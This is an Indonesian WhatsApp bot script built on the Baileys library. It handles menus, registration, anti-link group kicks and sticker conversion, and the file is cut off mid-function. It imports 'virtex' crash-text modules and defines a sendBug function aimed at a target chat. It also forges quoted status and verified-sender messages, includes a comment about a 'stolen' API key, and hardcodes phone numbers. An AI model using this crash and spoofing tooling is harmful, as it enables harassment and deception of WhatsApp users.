                                                                                                                                                                                                       /*
SC INI DIBUAT OLEH ZEROYT7
DAN DI RECODE OLEH rimu🗿🙏
HAPUS TQTQ?
KNTL BPK KAU PECAH (GADA BAPAK GOSAH BAPER🙏🗿)
                                                                                                                                                                                                       */

const 
{ 
WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
WALocationMessage,
WA_MESSAGE_STUB_TYPES,
WA_DEFAULT_EPHEMERAL,
ReconnectMode,
ProxyAgent,
GroupSettingChange,
waChatKey,
mentionedJid,
processTime,
} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const speed = require("performance-now")
const util = require('util')
const crypto = require('crypto')
const request = require('request')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const { removeBackgroundFromImageFile } = require('remove.bg')
const imgbb = require('imgbb-uploader');
const client = new WAConnection()
const qrcode = require('qrcode-terminal')
const qrkode = require("qrcode")
const toMs = require('ms')
const ms = require('parse-ms')
const os = require('os');
const { fetchJosn, fetchText, kyun } = require('./F3/fetcher')
const { color, bgcolor } = require('./F3/color')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./F3/functions')
const { virtex, vipi } = require('./F3/virtex.js')
const { virtex2 } = require('./F3/virtex2') 
const { virtex3 } = require('./F3/virtex3')
const { virtex4 } = require('./F3/virtex4')
const { virtex5 } = require('./F3/virtex5') 
const { virtex6 } = require('./F3/virtex6')
const { virtex7 } = require('./F3/virtex7')
const { virtex8 } = require('./F3/virtex8')
const { Toxic } = require('./F3/Toxic.js')
const premium = require('./F3/premium');
const setGelud = require('./F3/gameGelud.js')
const simple = require('./F3/simple.js')


//━━━━━━━━━━━━━━━[ SETTING ]━━━━━━━━━━━━━━━━━//

let botname = 'idle Shinobi bot' //NAMA BOT
let zerokey =  'ZeroYT7' //BIARIN AE:V
let lolkey = 'KurrXd' // FREE APIKEY NYOLONG DARI KURR:v
let zekskey = 'Nekonimastah' //Ganti Pake Api Lu Sendiri Biar Limitnya Gak Cepet Abis , Login Di zeks.me Untuk Mendapatkan Api Gratis
let ownername = 'Rimu' //NAMA OWNER
let owner = '62895320009580' // NOMOR OWNER
let bold = '*' 
let petik = '```'
let faketeks = `© Rimu` 

banChats = true; 
readGc = true; 
readPc = false;
autovn = true;
autoketik = true;

let hit_today = []
let tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
let ky_ttt = []

//━━━━━━━━━━━━━━━[ DATABASE ]━━━━━━━━━━━━━━━━━//

let _registered = JSON.parse(fs.readFileSync('./F2/registered.json'))
let register = JSON.parse(fs.readFileSync('./F2/registered.json'))
let _premium = JSON.parse(fs.readFileSync('./F2/premium.json'));
let ban = JSON.parse(fs.readFileSync('./F2/banned.json'))
let absen = JSON.parse(fs.readFileSync('./F2/absen.json'))
let antilink = JSON.parse(fs.readFileSync('./F2/antilink.json'))
let antivirtex = JSON.parse(fs.readFileSync('./F2/antivirtex.json'))

//━━━━━━━━━━━━━━━[ MODUL EXPORTS ]━━━━━━━━━━━━━━━━━//

module.exports = zeroyt7 = async (zeroyt7, mek, _welkom) => {
try {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
if (!mek.message) return
if (mek.key && mek.key.remoteJid == 'status@broadcast') return
global.ky_ttt
global.blocked
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const type = Object.keys(mek.message)[0]        
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const q = args.join(' ')
const Verived = "0@s.whatsapp.net"
const zer = "6285157740529@s.whatsapp.net"
const kuz = "62895320009580@s.whatsapp.net"
const txt = mek.message.conversation
const botNumber = zeroyt7.user.jid
const ownerNumber = [`${owner}@s.whatsapp.net`, `6283862323152@s.whatsapp.net`, `62895320009580@s.whatsapp.net`]
const isGroup = from.endsWith('@g.us')
const sender = isGroup ? mek.participant : mek.key.remoteJid
const totalchat = await zeroyt7.chats.all()
const groupMetadata = isGroup ? await zeroyt7.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isRegister = register.includes(sender)
const isBanned = ban.includes(sender)
const isPremium = premium.checkPremiumUser(sender, _premium)
const c = args.join(' ')
const m = simple.smsg(zeroyt7, mek)
const isListMsg = (type == 'listResponseMessage')
const conts = mek.key.fromMe ? zeroyt7.user.jid : zeroyt7.contacts[sender] || { notify: jid.replace(/@.+/, '') }
const pushname = mek.key.fromMe ? zeroyt7.user.name : conts.notify || conts.vname || conts.name || '-'
const isAntiLink = isGroup ? antilink.includes(from) : false
const isWelkom = isGroup ? _welkom.includes(from) : false
const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
idttt = []
players1 = []
players2 = []
gilir = []
for (let t of ky_ttt){
idttt.push(t.id)
players1.push(t.player1)
players2.push(t.player2)
gilir.push(t.gilir)
}
const isTTT = isGroup ? idttt.includes(from) : false
isPlayer1 = isGroup ? players1.includes(sender) : false
isPlayer2 = isGroup ? players2.includes(sender) : false
const isOwner = ownerNumber.includes(sender)
const arg = budy.slice(command.length + 2, budy.length)
try{
hit_total = await fetchJson('https://api.countapi.xyz/hit/api-alphabot.herokuapp.com/visits')
} catch {
hit_total = { 
value : "-"
}
}
hitall = `${hit_total.value}`
const sound1 = fs.readFileSync('./F1/sound1.mp3')                         
const sound2 = fs.readFileSync('./F1/sound2.mp3')
const sound3 = fs.readFileSync('./F1/sound3.mp3')
const sound4 = fs.readFileSync('./F1/sound4.mp3')
const sound5 = fs.readFileSync('./F1/sound5.mp3')
const desahan4 = fs.readFileSync('./F1/desahan4.mp3')
const Wib = moment().utcOffset('+0700').format('HH:mm')
const Wita = moment().utcOffset('+0800').format('HH:mm')
const Wit = moment().utcOffset('+0900').format('HH:mm')
const p1 = await zeroyt7.getStatus(sender)
const uptime = process.uptime();
const d = new Date
const locale = 'id'
const date = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })
const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Malam🌃'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Petang🌆'
}
if(time2 < "18:00:00"){
var ucapanWaktu = 'Sore🌅'
}
if(time2 < "15:00:00"){
var ucapanWaktu = 'Siang🏙'
}
if(time2 < "11:00:00"){
var ucapanWaktu = 'Pagi🌁'
}
if(time2 < "05:00:00"){
var ucapanWaktu = 'Malam🌉'
}
var ase = new Date();
var jamss = ase.getHours();
switch(jamss){
case 0: jamss = "Midnight 🌚"; break;
case 1: jamss = "Midnight 🌚"; break;
case 2: jamss = "Midnight 🌚"; break;
case 3: jamss = "Midnight 🌔"; break;
case 4: jamss = "Midnight 🌔"; break;
case 5: jamss = "Dawn 🌄"; break;
case 6: jamss = "Morning 🌄"; break;
case 7: jamss = "Morning 🌄"; break;
case 8: jamss = "Morning ☀️"; break;
case 9: jamss = "Morning ☀️"; break;
case 10: jamss = "Morning ☀️"; break;
case 11: jamss = "Afternoon 🌞"; break;
case 12: jamss = "Zuhur 🌞"; break;
case 13: jamss = "Afternoon 🌞"; break;
case 14: jamss = "Afternoon 🌞"; break;
case 15: jamss = "Asr 🌞"; break;
case 16: jamss = "Afternoon ☀️"; break;
case 17: jamss = "Evening 🌄"; break;
case 18: jamss = "Maghrib 🌄"; break;
case 19: jamss = "Isha 🌙"; break;
case 20: jamss = "Night 🌙"; break;
case 21: jamss = "Night 🌙"; break;
case 22: jamss = "Midnight 🌙"; break;
case 23: jamss = "Midnight 🌚"; break;
}
var tampilUcapan = "" + jamss;
const gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString(locale, { weekday: 'long' })
const calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
const daftar1 = `Hai kak  ${pushname} ${ucapanWaktu}\nSebelum Menggunakan Fitur Bot Verify Terlebih Dahulu Ya`
const daftar2 = 'Ketik Tombol Di Bawah Untuk Verify Kak\nBisa Juga Dengan Ketik .verify'
const daftar3 = [{buttonId: `!verify`,buttonText: {displayText: `Verify😈`,},type: 1,},]
const kon1 = `Hai kak ${pushname} Itu Ownerku Mau Tanya Soal Apa Ya?😗`
const kon2 = `${faketeks}`
const kon3 = [{buttonId: `!sc`,buttonText: {displayText: `Sc Bot`,},type: 1,},{buttonId: `!sewabot`,buttonText: {displayText: `Sewa Bot`,},type: 1,}]
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
let po = zeroyt7.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Take Here","listType": "SINGLE_SELECT","sections": list}}, {})
return zeroyt7.relayWAMessage(po, {waitForAck: true})
}
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms));
}
const sotoy = [
'🍊 : 🍒 : 🍐',
'🍒 : 🔔 : 🍊',
'🍇 : 🍇 : 🍐',
'🍊 : 🍋 : 🔔', 
'🔔 : 🍒 : 🍐',
'🔔 : 🍒 : 🍊',
'🍊 : 🍋 : 🔔',        
'🍐 : 🍒 : 🍋',
'🍐 : 🍒 : 🍐',
'🍊 : 🍒 : 🍒',
'🔔 : 🔔 : 🍇',
'🍌 : 🍌 : 🔔',
'🍐 : 🔔 : 🔔',
'🍊 : 🍋 : 🍒',
'🍋 : 🍋 : 🍋 Win👑',
'🔔 : 🔔 : 🍇',
'🔔 : 🍇 : 🍇', 
'🔔 : 🍐 : 🔔',
'🍌 : 🍌 : 🍌 Win👑'
]
countDownDate = new Date("2022-01-01").getTime();
var now = new Date().getTime();
var distance = countDownDate - now;
var dayss = Math.floor(distance / (1000 * 60 * 60 * 24));
var hourss = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
var minutess = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
var secondss = Math.floor((distance % (1000 * 60)) / 1000);
var now = new Date().getTime();
var distance = countDownDate - now;
var dayss = Math.floor(distance / (1000 * 60 * 60 * 24));
var hourss = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
var minutess = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
var secondss = Math.floor((distance % (1000 * 60)) / 1000);
newYear = `${dayss}Hari ${hourss}Jam ${minutess}Menit ${secondss}Detik`
countDownDate = new Date("2022-04-02").getTime();
Ramadhan = `${dayss}Hari ${hourss}Jam ${minutess}Menit ${secondss}Detik`
var ampun = await zeroyt7.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await zeroyt7.chatRead(jid)
})
var chatss = await zeroyt7.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await zeroyt7.chatRead(jid)
})
if (autovn) {
if (autovn === false) return
await zeroyt7.updatePresence(from, Presence.recording)
} else if (autoketik) {
if (autoketik === false) return
await zeroyt7.updatePresence(from, Presence.composing)
}

//━━━━━━━━━━━━━━━[ CONNECTION 1 ]━━━━━━━━━━━━━━━━━//

mess = {
wait: '*Sedang Diproses*',
success: '*Success Kak*',
error: {
stick: '*Error*',
Iv: '*Link Error* !',
api: '*Terjadi Kesalahan*',
Ban: '*Maaf Tapi Kamu Sudah Terbanned Silahkan Minta Owner Untuk Membukanya*'
},
only: {
owner: '*Perintah Ini Hanya Bisa Digunakan Oleh Owner*',
admin: '*Perintah Ini Hanya Bisa Digunakan Oleh Admin Grup*',
prem: '*Perintah Ini Hanya Bisa Digunakan Oleh Member Premium, Silahkan Buy Premium Ke Owner*',
group: '*Perintah Ini Hanya Bisa Digunakan Di Dalam Grup*',
Badmin: '*Perintah Ini Bisa Digunakan Setelah Bot Dijadikan Menjadi Admin*'
}
}
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
} 
const reply = (teks) => {
zeroyt7.sendMessage(from, teks, text, {quoted:mek})
}
const hideTagKontak = async function(from, nomor, nama){
let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
let anu = await zeroyt7.groupMetadata(from)
let members = anu.participants
let ane = []
for (let i of members){
ane.push(i.jid)
}
zeroyt7.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
}
const sendMess = (hehe, teks) => {
zeroyt7.sendMessage(hehe, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? zeroyt7.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : zeroyt7.sendMessage(from, teks.trim(), extendedText, { quoted: fstatus, contextInfo: { "mentionedJid": memberr } })
}
const zero = fs.readFileSync ('thumbnail.jpg')
const costum = (pesan, tipe, target, target2) => {
zeroyt7.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
}
let runtime = function (seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor((seconds % (3600 * 24)) / 3600);
var m = Math.floor((seconds % 3600) / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
};
const p2 = '.'


//━━━━━━━━━━━━━━━[ BUTTON ]━━━━━━━━━━━━━━━━━//

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
  };
  zeroyt7.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
  );
};
const sendButton = async (from, context, fortext, but, mek) => {
buttonMessages = {
contentText: context,
footerText: fortext,
buttons: but,
headerType: 1
}
zeroyt7.sendMessage(from, buttonMessages, buttonsMessage, {
quoted: fstatus
})
}
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await zeroyt7.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
zeroyt7.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
const sendBug = async (target) => {
await zeroyt7.relayWAMessage(
zeroyt7.prepareMessageFromContent(
target,
zeroyt7.prepareDisappearingMessageSettingContent(0),
{}
),{ waitForAck: true }) 
}
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await zeroyt7.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
zeroyt7.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
const sendButImage = async (from, context, fortext, img, but, mek) => {
jadinya = await zeroyt7.prepareMessage(from, img, image)
buttonMessagesI = {
imageMessage: jadinya.message.imageMessage,
contentText: context,
footerText: fortext,
buttons: but,
headerType: 4
}
zeroyt7.sendMessage(from, buttonMessagesI, buttonsMessage, {
quoted: fstatus,
contexInfo: adyt
})
}
(function(_0x2ca6e6,_0x5bc8fb){const _0x4084a5=_0x2ca6e6();function _0x11b8c1(_0x3a5899,_0x3438c6){return _0x14a5(_0x3438c6- -0x3d8,_0x3a5899);}while(!![]){try{const _0xd9301a=parseInt(_0x11b8c1(-0x26a,-0x264))/0x1*(-parseInt(_0x11b8c1(-0x26d,-0x267))/0x2)+parseInt(_0x11b8c1(-0x26f,-0x273))/0x3+-parseInt(_0x11b8c1(-0x26a,-0x271))/0x4*(parseInt(_0x11b8c1(-0x26d,-0x269))/0x5)+-parseInt(_0x11b8c1(-0x266,-0x266))/0x6*(parseInt(_0x11b8c1(-0x260,-0x268))/0x7)+parseInt(_0x11b8c1(-0x267,-0x26a))/0x8*(parseInt(_0x11b8c1(-0x26d,-0x265))/0x9)+-parseInt(_0x11b8c1(-0x270,-0x270))/0xa+parseInt(_0x11b8c1(-0x272,-0x26d))/0xb*(parseInt(_0x11b8c1(-0x268,-0x26e))/0xc);if(_0xd9301a===_0x5bc8fb)break;else _0x4084a5['push'](_0x4084a5['shift']());}catch(_0x1427ff){_0x4084a5['push'](_0x4084a5['shift']());}}}(_0x2e7b,0x24e23));const sendButVideo=async(_0x40f15b,_0x1d9c9b,_0x2f2402,_0x5f4e6e,_0xe76a32,_0xe617ff)=>{jadinya=await zeroyt7[_0x3f0efe(0x31d,0x322)](_0x40f15b,_0x5f4e6e,video),buttonMessagesV={'videoMessage':jadinya[_0x3f0efe(0x324,0x322)]['videoMessage'],'contentText':_0x1d9c9b,'footerText':_0x2f2402,'buttons':_0xe76a32,'headerType':0x5};function _0x3f0efe(_0x496cca,_0x9ed82b){return _0x14a5(_0x496cca-0x1b7,_0x9ed82b);}zeroyt7[_0x3f0efe(0x323,0x328)](_0x40f15b,buttonMessagesV,buttonsMessage,{'quoted':fstatus});},sendList=async(_0x2a1f3e,_0x3748bc,_0x5e04cc,_0x21c17f,_0xf98293)=>{function _0x3f9979(_0x33a1ee,_0x36fa46){return _0x14a5(_0x36fa46- -0x334,_0x33a1ee);}button={'buttonText':_0x3748bc,'description':_0x5e04cc,'sections':_0x21c17f,'listType':0x1},zeroyt7[_0x3f9979(-0x1ce,-0x1c8)](_0x2a1f3e,button,listMessage,{'quoted':fstatus});};function _0x14a5(_0x470700,_0x5890a0){const _0x2e7b89=_0x2e7b();return _0x14a5=function(_0x14a5bf,_0x22c3a7){_0x14a5bf=_0x14a5bf-0x165;let _0x13bca4=_0x2e7b89[_0x14a5bf];return _0x13bca4;},_0x14a5(_0x470700,_0x5890a0);}function hi(){function _0x1c1129(_0x1cb5b2,_0x9ffab5){return _0x14a5(_0x1cb5b2-0xeb,_0x9ffab5);}console[_0x1c1129(0x254,0x24d)]('By\x20rimu');}hi();function _0x2e7b(){const _0x4fe116=['6yGIOCZ','81EFQHsO','149PewFpN','655608rulnmj','prepareMessage','4768zTJZZK','2519040FHIWiO','log','48IGxVuS','712305jkvXYz','sendMessage','message','121696qYxOdF','40ewhMhO','389417uUBkfV','1964PxTKtP'];_0x2e7b=function(){return _0x4fe116;};return _0x2e7b();}
//sendButLoc(id/from, "string", "string", image, but, mek)
 function _0x49e8(){const _0x2abf1f=['128458zaqRph','15LuvETp','32FoIOpf','By\x20:\x20Prassz','307917pLgBPR','@Iam_rimux','127514DLEruK','2301110zFGGkR','11iUrhyl','5IBSTLg','sendMessage','2099160NwtLDQ','672988HpVyoZ','1059558OLmAKI'];_0x49e8=function(){return _0x2abf1f;};return _0x49e8();}(function(_0x4b5fea,_0xcd96a7){const _0xd54c3c=_0x9a06,_0x555513=_0x4b5fea();while(!![]){try{const _0x4e06eb=parseInt(_0xd54c3c(0x12b))/0x1+parseInt(_0xd54c3c(0x123))/0x2*(parseInt(_0xd54c3c(0x12c))/0x3)+-parseInt(_0xd54c3c(0x129))/0x4*(parseInt(_0xd54c3c(0x126))/0x5)+-parseInt(_0xd54c3c(0x12a))/0x6+-parseInt(_0xd54c3c(0x128))/0x7+parseInt(_0xd54c3c(0x12d))/0x8*(parseInt(_0xd54c3c(0x12f))/0x9)+-parseInt(_0xd54c3c(0x124))/0xa*(-parseInt(_0xd54c3c(0x125))/0xb);if(_0x4e06eb===_0xcd96a7)break;else _0x555513['push'](_0x555513['shift']());}catch(_0x5da84c){_0x555513['push'](_0x555513['shift']());}}}(_0x49e8,0x2960e));function _0x9a06(_0x41e8cb,_0x44ab09){const _0x49e8d9=_0x49e8();return _0x9a06=function(_0x9a063c,_0x40f3e3){_0x9a063c=_0x9a063c-0x123;let _0x55b451=_0x49e8d9[_0x9a063c];return _0x55b451;},_0x9a06(_0x41e8cb,_0x44ab09);}const sendButLoc=async(_0x151338,_0x56cd7c,_0x33ce1f,_0xbff411,_0x1ecc85,_0x40a38d)=>{const _0xf018e3=_0x9a06;return buttonMessagesL={'contentText':_0x56cd7c,'footerText':_0x33ce1f,'buttons':_0x1ecc85,'headerType':0x6,'locationMessage':{'degreesLatitude':0x0,'degreesLongitude':0x0,'name':_0xf018e3(0x130),'address':_0xf018e3(0x12e),'jpegThumbnail':_0xbff411}},zeroyt7[_0xf018e3(0x127)](_0x151338,buttonMessagesL,buttonsMessage,{'quoted':_0x40a38d});};
const adyt = { 
"title": `Hallo ${pushname}`,
"body": `hy`, 
"mediaType": "2", 
"mediaUrl": "https://youtu.be/ilrhJV_QMIE",  
"thumbnail": fs.readFileSync('thumbnail.jpg')
}


//━━━━━━━━━━━━━━━[ FAKE FAKEAN ]━━━━━━━━━━━━━━━━━//

const katalog = (teks) => {
res = zeroyt7.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 111119999, "message": teks, "footerText": "rimuX😈", "thumbnail": fs.readFileSync('thumbnail.jpg'), "surface": 'CATALOG' }}, {quoted:fstatus})
zeroyt7.relayWAMessage(res)}
const fakeyt = (teks) => { 
zeroyt7.sendMessage(from, teks, text,{contextInfo :{text: 'hi', "forwardingScore": 1000000000, isForwarded: false, sendEphemeral: false, "externalAdReply": { "title": `hallo ${pushname}🗿` , "body": `Subs YT rimu Ya🗿`, "mediaType": "2", "thumbnailUrl": "https://c.top4top.io/p_2087f30hj1.jpeg", "mediaUrl": "https://youtu.be/hiCXp2lbAHA", "thumbnail": fs.readFileSync('thumbnail.jpg'), "sourceUrl": "", },mentionedJid:[sender]}, quoted : fstatus})};

const fakestatus = (teks) => { zeroyt7.sendMessage(from, teks, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": faketeks, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('thumbnail.jpg'), "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}})}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} }
const fstatus = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Follow My Ig @iam.rimux", 'jpegThumbnail': fs.readFileSync('thumbnail.jpg')}}}

//━━━━━━━━━━━━━━━[ CONNECTION 2 ]━━━━━━━━━━━━━━━━━//

const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './stik' + names + '.png', async function () {
console.log('selesai');
let filess = './stik' + names + '.png'
let asw = './stik' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
zeroyt7.sendMessage(to, media, MessageType.sticker,{quoted:mek})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}
const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./F2/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}
const isRegistered = checkRegisteredUser(sender)
const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
zeroyt7.sendMessage(to, media, type, { quoted: fstatus, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
fs.unlinkSync(filename)
});
}   
if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply('Admin Mah Bebas Yekan:v')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP LINK DETECTOR 」*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup :(`)
setTimeout(() => {
zeroyt7.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
}, 0)
}
if (budy.includes("youtu")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply('Admin Mah Bebas Yekan:v')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 YT LINK DETECTOR 」*\nKamu mengirimkan link youtube, maaf kamu di kick dari grup :(`)
setTimeout(() => {
zeroyt7.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
}, 0)
}
if (budy.includes("wa.me/")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply('Admin Mah Bebas Yekan:v')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 ANTI LINK NOMOR DETECTOR 」*\nKamu mengirimkan link nomor, maaf kamu di kick dari grup :(`)
setTimeout(() => {
zeroyt7.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
}, 0)
}
if (budy.length > 3500) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return reply('Admin Mah Bebas Yekan:v')
reply('Tandai telah dibaca\n'.repeat(300))
